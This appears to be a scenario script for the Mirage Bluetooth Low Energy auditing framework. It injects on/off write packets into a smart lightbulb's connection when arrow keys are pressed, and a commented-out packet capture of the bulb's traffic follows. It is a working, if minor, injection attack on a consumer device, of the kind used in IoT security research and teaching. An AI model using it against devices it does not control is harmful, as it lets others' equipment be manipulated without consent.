from mirage.core import scenario
from mirage.libs import io,ble,utils

class lightbulb_injection(scenario.Scenario):

	# When the module starts...
	def onStart(self):
		self.emitter = self.module.getEmitter(self.module["INTERFACE"])
		pass

	# When a key is pressed...
	def onKey(self,key):
		# if the key is 'up arrow' ...

		io.info(key)

		if key == "up":
			# inject a ON packet
			self.emitter.send(ble.BLEWriteCommand(handle=0x0021,value=b"\x55\x10\x01\x0d\x0a"))
		# if the key is 'down arrow' ...
		elif key == "down":
			# inject a OFF packet
			self.emitter.send(ble.BLEWriteCommand(handle=0x0021,value=b"\x55\x10\x00\x0d\x0a"))
		elif key == 'q':
			exit()

		return True




		# # io.info("Done a thing.")
                
		# # for _ in range(5):
		# # 	utils.wait(seconds=1)
		# # 	self.hello("Romain")

		# if self.scenarioEnabled:
		# 	pass
		# return self.ok({})

# 		[PACKET] [ CH:14|CLK:30677771.0|RSSI:0dBm ] << BLE - Control PDU Packet | type=LL_FEATURE_REQ | data=ff7f003700000000 >>
# [PACKET] [ CH:10|CLK:30767779.0|RSSI:0dBm ] << BLE - Control PDU Packet | type=LL_VERSION_IND | data=0b7500b823 >>
# [PACKET] [ CH:20|CLK:30857783.0|RSSI:0dBm ] << BLE - Control PDU Packet | type=LL_CONNECTION_UPDATE_REQ | data=01040006000000f4010a00 >>
# [PACKET] [ CH:20|CLK:30858339.0|RSSI:0dBm ] << BLE - Read By Group Type Request Packet >>
# [PACKET] [ CH:10|CLK:30902785.0|RSSI:0dBm ] << BLE - Read By Group Type Request Packet >>
# [PACKET] [ CH:11|CLK:30947787.0|RSSI:0dBm ] << BLE - Read By Group Type Request Packet >>
# [PACKET] [ CH:16|CLK:31082793.0|RSSI:0dBm ] << BLE - Read By Group Type Request Packet >>
# [PACKET] [ CH:20|CLK:31140295.0|RSSI:0dBm ] << BLE - Read By Type Request >>
# [PACKET] [ CH:11|CLK:31155296.0|RSSI:0dBm ] << BLE - Read By Type Request >>
# [PACKET] [ CH:2|CLK:31170296.0|RSSI:0dBm ] << BLE - Read By Type Request >>
# [PACKET] [ CH:17|CLK:31185297.0|RSSI:0dBm ] << BLE - Read By Type Request >>
# [PACKET] [ CH:3|CLK:31200298.0|RSSI:0dBm ] << BLE - Read By Type Request >>
# [PACKET] [ CH:12|CLK:31215298.0|RSSI:0dBm ] << BLE - Read By Type Request >>
# [PACKET] [ CH:3|CLK:31230287.0|RSSI:0dBm ] << BLE - Find Information Request Packet >>
# [PACKET] [ CH:13|CLK:31252800.0|RSSI:0dBm ] << BLE - Control PDU Packet | type=LL_CONNECTION_UPDATE_REQ | data=01020024000000f4012100 >>
# [PACKET] [ CH:15|CLK:31532812.0|RSSI:0dBm ] << BLE - Read Request Packet | handle=0x9 >>
# [PACKET] [ CH:20|CLK:31667818.0|RSSI:0dBm ] << BLE - Write Command Packet | handle=0x9 | value=7e0783073a0405ffef >>
# [PACKET] [ CH:18|CLK:32612858.0|RSSI:0dBm ] << BLE - Control PDU Packet | type=LL_CONNECTION_UPDATE_REQ | data=010100300003002c014400 >>
# [PACKET] [ CH:18|CLK:32613414.0|RSSI:0dBm ] << BLE - Connection Parameter Update Response Packet | moveResult=0 >>
# [PACKET] [ CH:13|CLK:32657860.0|RSSI:0dBm ] << BLE - Connection Parameter Update Response Packet | moveResult=0 >>
# [PACKET] [ CH:2|CLK:34144682.0|RSSI:0dBm ] << BLE - Control PDU Packet | type=LL_CHANNEL_MAP_REQ | data=ffff1f00007200 >>
# [PACKET] [ CH:16|CLK:34204242.0|RSSI:0dBm ] << BLE - Control PDU Packet | type=LL_CHANNEL_MAP_REQ | data=ffff1f00007200 >>
# [PACKET] [ CH:16|CLK:34204766.0|RSSI:0dBm ] << BLE - Write Command Packet | handle=0x9 | value=7e070503ff030010ef >>
# [PACKET] [ CH:17|CLK:34264247.0|RSSI:0dBm ] << BLE - Write Command Packet | handle=0x9 | value=7e070503ff030010ef >>
# [PACKET] [ CH:6|CLK:37264547.0|RSSI:0dBm ] << BLE - Write Command Packet | handle=0x9 | value=7e0705030000ff10ef >>
# [PACKET] [ CH:0|CLK:38824613.0|RSSI:0dBm ] << BLE - Write Command Packet | handle=0x9 | value=7e070503ff000010ef >>
# [PACKET] [ CH:11|CLK:39664649.0|RSSI:0dBm ] << BLE - Write Command Packet | handle=0x9 | value=7e070503ffff0010ef >>
# [FAIL] Connection lost !
# [INFO] Mirage process terminated !
